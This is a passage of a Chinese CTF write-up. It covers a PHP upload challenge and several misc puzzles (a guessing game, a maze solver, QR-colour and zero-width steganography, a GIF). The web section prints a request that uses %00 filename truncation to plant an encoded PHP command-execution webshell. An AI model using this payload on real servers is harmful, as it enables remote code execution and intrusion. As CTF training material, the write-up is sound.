+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$base64_img</span> = trim(<span class="variable">$_POST</span>[<span class="string">&#x27;img&#x27;</span>]);</span><br><span class="line"><span class="variable">$id</span> = trim(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$url</span> = trim(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="variable">$up_dir</span> = <span class="string">&#x27;./img/&#x27;</span>;<span class="comment">//存放在当前目录的img文件夹下</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$id</span>) || <span class="keyword">empty</span>(<span class="variable">$url</span>) || <span class="keyword">empty</span>(<span class="variable">$base64_img</span>))&#123; </span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$up_dir</span>))&#123;</span><br><span class="line">  mkdir(<span class="variable">$up_dir</span>,<span class="number">0777</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span>, <span class="variable">$base64_img</span>, <span class="variable">$result</span>))&#123;</span><br><span class="line">  <span class="variable">$type</span> = <span class="variable">$result</span>[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span>(in_array(<span class="variable">$type</span>,<span class="keyword">array</span>(<span class="string">&#x27;bmp&#x27;</span>,<span class="string">&#x27;png&#x27;</span>)))&#123;</span><br><span class="line">    <span class="variable">$new_file</span> = <span class="variable">$up_dir</span>.<span class="variable">$id</span>.<span class="string">&#x27;_&#x27;</span>.date(<span class="string">&#x27;mdHis_&#x27;</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$type</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$new_file</span>, base64_decode(str_replace(<span class="variable">$result</span>[<span class="number">1</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$base64_img</span>)));</span><br><span class="line">    header(<span class="string">&quot;Location: &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现其中存在文件的写入，拦截请求尝试构建载荷写入 shell，但是此处的文件名只有 <code>id</code> 是可控的位置。查看请求的 <code>X-Powered-By</code> 可知后端使用的是 PHP 5.2.17，而这个版本存在 <code>%00</code> 截断，因此可以使用如下的载荷写入 shell。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/qbl.php?id=shell.php%00.png&amp;url=http://baidu.com</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:25651</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>76</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">img=data%3Aimage%2Fpng%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUWyJoZXgiXSk7ID8%2b</span><br></pre></td></tr></table></figure>
+
+<p>利用 shell 即可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7bdd5754-549e-46ac-b2c4-17d86543ee8e&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h3><blockquote>
+<p>红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？</p>
+</blockquote>
+<p>有时间限制的猜测小游戏，需要连续猜对 66 次，一次 nc 连接的 66 个结果是固定的。因此只需要一边不断猜测一边记录结果，输了就按照结果重新猜测，即可最终到达 66 次。写出如下脚本来获取 flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">proc = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29400</span>)</span><br><span class="line">proc.recvuntil(<span class="string">&quot;To get the flag if you predict the results of all games successfully!&quot;</span>)</span><br><span class="line">answers = &#123;&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response = proc.recvuntil(<span class="string">&quot;choose one [r] Red Team,[b] Blue Team:&quot;</span>)</span><br><span class="line">    position = response.index(<span class="string">b&quot;Game&quot;</span>)</span><br><span class="line">    <span class="built_in">round</span>: <span class="built_in">int</span> = <span class="built_in">int</span>(response[position + <span class="number">5</span>:position + <span class="number">8</span>].split(<span class="string">b&quot;\n&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] length of answer <span class="subst">&#123;<span class="built_in">len</span>(answers)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(answers) &lt; <span class="built_in">round</span>:</span><br><span class="line">        decision = <span class="string">&quot;b&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        decision = answers[<span class="built_in">round</span> - <span class="number">1</span>]</span><br><span class="line">    proc.sendline(decision)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;<span class="built_in">round</span>&#125;</span> round decision <span class="subst">&#123;decision&#125;</span>&quot;</span>)</span><br><span class="line">    response = proc.recvregex(<span class="string">r&quot;(.*?)The result \w&#123;3,4&#125; Team&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (decision == <span class="string">&quot;b&quot;</span> <span class="keyword">and</span> <span class="string">b&quot;The result Blue Team&quot;</span> <span class="keyword">in</span> response) <span class="keyword">or</span> (</span><br><span class="line">            decision == <span class="string">&quot;r&quot;</span> <span class="keyword">and</span> <span class="string">b&quot;The result Red Team&quot;</span> <span class="keyword">in</span> response):</span><br><span class="line">        answers[<span class="built_in">round</span> - <span class="number">1</span>] = decision</span><br><span class="line">        proc.recvregex(<span class="string">r&quot;The number of successful predictions \d&#123;1,2&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">round</span> == <span class="number">66</span>:</span><br><span class="line">            proc.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(proc.recvuntil(<span class="string">&quot;\n&quot;</span>).decode().strip())</span><br><span class="line">            proc.close()</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        answers[<span class="built_in">round</span> - <span class="number">1</span>] = (<span class="string">&quot;r&quot;</span> <span class="keyword">if</span> decision == <span class="string">&quot;b&quot;</span> <span class="keyword">else</span> <span class="string">&quot;b&quot;</span>)</span><br><span class="line">        proc.sendafter(<span class="string">&quot;Play again? (y/n):&quot;</span>, <span class="string">&quot;y&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4bb39602-5ad7-4110-a685-b1efbf555268&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="funny-maze"><a href="#funny-maze" class="headerlink" title="funny_maze"></a>funny_maze</h3><blockquote>
+<p>七月被困在了迷宫里，十秒后迷宫的终点就要永远消失了，你能帮她走出迷宫吗？</p>
+</blockquote>
+<p>对所给出的迷宫使用 DFS 计算最短可行路径，写出如下脚本来获取 flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">MIN = <span class="number">2147483647</span></span><br><span class="line">mazeMaxArray = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line">signPoints = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">startX, startY, endX, endY, maze, stepCount</span>):</span></span><br><span class="line">    nextSteps = [[<span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, -<span class="number">1</span>], [-<span class="number">1</span>, <span class="number">0</span>]]  <span class="comment"># right, down, left, up</span></span><br><span class="line">    <span class="keyword">if</span> startX == endX <span class="keyword">and</span> startY == endY:</span><br><span class="line">        <span class="keyword">global</span> MIN</span><br><span class="line">        <span class="keyword">if</span> stepCount &lt; MIN:</span><br><span class="line">            MIN = stepCount</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> nextStep <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nextSteps)):</span><br><span class="line">        nextX = startX + nextSteps[nextStep][<span class="number">0</span>]</span><br><span class="line">        nextY = startY + nextSteps[nextStep][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> nextX &lt; <span class="number">0</span> <span class="keyword">or</span> nextY &lt; <span class="number">0</span> <span class="keyword">or</span> nextX &gt; <span class="built_in">len</span>(maze) <span class="keyword">or</span> nextY &gt; <span class="built_in">len</span>(maze[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> mazeMaxArray[nextX][nextY] == <span class="number">0</span> <span class="keyword">and</span> signPoints[nextX][nextY] == <span class="number">0</span>:</span><br><span class="line">            signPoints[nextX][nextY] = <span class="number">1</span></span><br><span class="line">            dfs(nextX, nextY, endX, endY, maze, stepCount + <span class="number">1</span>)</span><br><span class="line">            signPoints[nextX][nextY] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proc = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28565</span>)</span><br><span class="line">proc.sendlineafter(<span class="string">&quot;3.Introduction to this game\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    maze = proc.recvuntil(<span class="string">&quot;Please enter your answer:&quot;</span>).decode().replace(<span class="string">&quot;Please enter your answer:&quot;</span>, <span class="string">&quot;&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    maze = maze.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    startY = <span class="number">0</span></span><br><span class="line">    startX = <span class="number">0</span></span><br><span class="line">    endY = <span class="number">0</span></span><br><span class="line">    endX = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(maze)):</span><br><span class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(maze[line])):</span><br><span class="line">            <span class="keyword">if</span> maze[line][character] == <span class="string">&quot;S&quot;</span>:</span><br><span class="line">                startX, startY = line, character</span><br><span class="line">            <span class="keyword">if</span> maze[line][character] == <span class="string">&quot;E&quot;</span>:</span><br><span class="line">                endX, endY = line, character</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> maze[:]:</span><br><span class="line">        line = line.translate(<span class="built_in">str</span>.maketrans(<span class="string">&quot;SE&quot;</span>, <span class="string">&quot;  &quot;</span>))</span><br><span class="line">    mazeArray = [[<span class="number">1</span> <span class="keyword">if</span> character == <span class="string">&quot;#&quot;</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> character <span class="keyword">in</span> line] <span class="keyword">for</span> line <span class="keyword">in</span> maze]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mazeArray)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mazeArray[<span class="number">0</span>])):</span><br><span class="line">            mazeMaxArray[i][j] = mazeArray[i][j]</span><br><span class="line">    signPoints[startX][startY] = <span class="number">1</span></span><br><span class="line">    dfs(startX, startY, endX, endY, mazeArray, <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(MIN + <span class="number">1</span>)</span><br><span class="line">    proc.sendline(<span class="built_in">str</span>(MIN + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">3</span>:</span><br><span class="line">        proc.recvline()</span><br><span class="line">        proc.recvline()</span><br><span class="line">        <span class="built_in">print</span>(proc.recvline().decode().strip())</span><br><span class="line">        <span class="built_in">print</span>(proc.recvline().decode().strip())</span><br><span class="line">        <span class="built_in">print</span>(proc.recvline().decode().strip())</span><br><span class="line">        proc.close()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    response = proc.recvuntil(<span class="string">&quot;So, Let&#x27;s move on to the next level!\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.decode().strip())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># reinitiate the map</span></span><br><span class="line">    MIN = <span class="number">2147483647</span></span><br><span class="line">    mazeMaxArray = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]</span><br><span class="line">    signPoints = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a6fac77f-4695-4284-abd1-d38839fbca41&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nuclear-wastewater"><a href="#Nuclear-wastewater" class="headerlink" title="Nuclear wastewater"></a>Nuclear wastewater</h3><blockquote>
+<p>小明去日本旅游时，发现了一张被核废水污染过的二维码，你能从中发现什么信息吗。</p>
+</blockquote>
+<p>解压附件后可以得到如下图片。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628041914070540/0a0131de6eb133ca61a03eacff8395334530eb6d.png@100w"></p>
+<p>观察其颜色可以发现大多数色块都只用了 R/G/B 其中一种颜色。因此写出如下脚本尝试将其中的值取出，发现一堆字符的出现频度有差别，进而进行词频统计。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&quot;./Nuclear wastewater.png&quot;</span>)</span><br><span class="line">width, height = image.size</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>, width - <span class="number">10</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>, height - <span class="number">10</span>, <span class="number">10</span>):</span><br><span class="line">        r, g, b = image.getpixel((x, y))</span><br><span class="line">        datum = r + g + b</span><br><span class="line">        <span class="keyword">if</span> <span class="number">32</span> &lt; datum &lt; <span class="number">127</span>:</span><br><span class="line">            data.append(<span class="built_in">chr</span>(datum))</span><br><span class="line"></span><br><span class="line">wordFrequency = collections.Counter(data)</span><br><span class="line"><span class="keyword">for</span> word, frequency <span class="keyword">in</span> wordFrequency.most_common():</span><br><span class="line">    <span class="keyword">if</span> frequency == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(word, end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本可以得到如下关键信息。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theKEYis:#R@&#x2F;&amp;p~!</span><br></pre></td></tr></table></figure>
+
+<p>使用此  key 解压附件中的压缩文档可得如下字符串。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‌‌‌‌‌‌‌‍‎‍‎‌‌‌‌‌‌‌‍‎‍‌‌‌‌‌‌‌‌‍‎‍‎‌‌‌‌‌‌‌‍‎‍‍‌‍‌‎‌‌‍‍‍‎‌‌‌‌‌‌‌‌‍‎‎‍‌‍‍‌‌‌‍‍‎‎‌‌‌‌‌‌‌‌‍‎‍‍‌‌‌‌‌‌‌‍‎‎‌‌‍‌‎‎‎‍‌‌‍‌‍‌‌‎‎‍‎‌‌‎‌‌‍‍‌‌‍‎‍‌‍‍‌‍‌‎‌‌‎‌‌‍‍‌‍‍‌‍‎‎‎‎‎‍‌‍‌‍‌‍‎‍‍‌‍‌‌‌‌‌‌‌‎‍‍‍‌‌‌‌‌‌‍‌‎‎‌‌‌‌‌‌‌‍‍‌‎‎‌‌‌‌‌‌‍‍‌‎‌‌‌‌‌‌‌‍‌‎‎‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‌‎‍‌‎‌‌‍‌‍‍‍‎‍‎‍‎‌‍‌‌‌‌‌‌‌‎‍‍‍‌‌‌‌‌‌‍‌‌‍‌‌‌‌‌‌‌‍‌‌‎‍‌‌‌‌‌‌‌‍‎‍‍‌‍‌‎‌‌‌‌‍‌‌‌‍‌‍‎‍‌‌‍‎‎OIENKMAJOLEOKMAJOHECLHBCPGFDLNBIPAFFLPBKPIFNLEBBPPFKLFBAPEFBLJBMPHFCLEBBPMFJLEBBPLFOLHBCPCFHLNBIPDFGLHBCPPFKLIBNPHFCLDBGPGFDLBBEPPFKLHBCPPFKLMBJPDFGLCBHPHFCLBBEPIFNLNBIPOFLLMBJPDFGLBBEPEFBLBBEPPFKLGBDPOFLLABFPMFJLABFPCFHLNBIPDFGLMBJPEFBLIBNPHFCLLBOPOFLLBBEPIFNLDBGPAFFKAAFOPEKKDAGOGEDKJAMOAEFKLAOOIENLIBNPEFBLLBOPJFMLFBAPLFOLFBAPNFILEBBPLFOLFBAPAFFLJBMPHFCLJBMPBFELIBNPHFCLIBNPNFILBBEPPFKKPAKOHECKMAJOAEFKKAPOIENKFAAOLEOKHACOPEKKAAFOPEKKAAFOFEAKJAMOHECKLAOODEGKMAJOAEFKPAKONEIKBAEOIENKAAFODEGKAAFOPEKKLAOOOELKJAMOAEFKGADOFEAKEABOLEOKOALOLEOKJAMOAEFKIANOLEOKIANOEEBKFAAOHECKBAEOIENKJAMOKEPKMAJPMFJLCBHPEFBLNBI‌‍‌‌‌‍‍‌‎‌‍‌‍‌‌‌‍‌‎‎‎‍‌‍‎‎‌‌‍‎‍‌‎</span><br></pre></td></tr></table></figure>
+
+<p>很明显存在零宽字符隐写，使用如下三种字符解码可得提示。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">U+200C ZERO WIDTH NON-JOINER</span><br><span class="line">U+200D ZERO WIDTH JOINER</span><br><span class="line">U+200E LEFT-TO-RIGHT MARK</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021年4月13日，核废水在Citrix县的CTX1市尤为严重</span><br></pre></td></tr></table></figure>
+
+<p>按照提示对去除隐写的字符串进行两次 Citrix CTX1 Decode 可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;98047de9ce5aaa4c0031fb55e9dfac70&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Just-a-GIF"><a href="#Just-a-GIF" class="headerlink" title="Just a GIF"></a>Just a GIF</h3><blockquote>
+<p>你能从GIF中找到小豆泥隐藏的flag吗？</p>
+</blockquote>
+<p> 解压附件可得一个循环的小豆泥打拳动图，将其分帧可得 11 帧为一组的循环。参考 CISCN 2021 Quals 的动图题目，将每一组的图与第一组的对照后合并，可以得到九张包含类二维码的图和两张顺序图。</p>
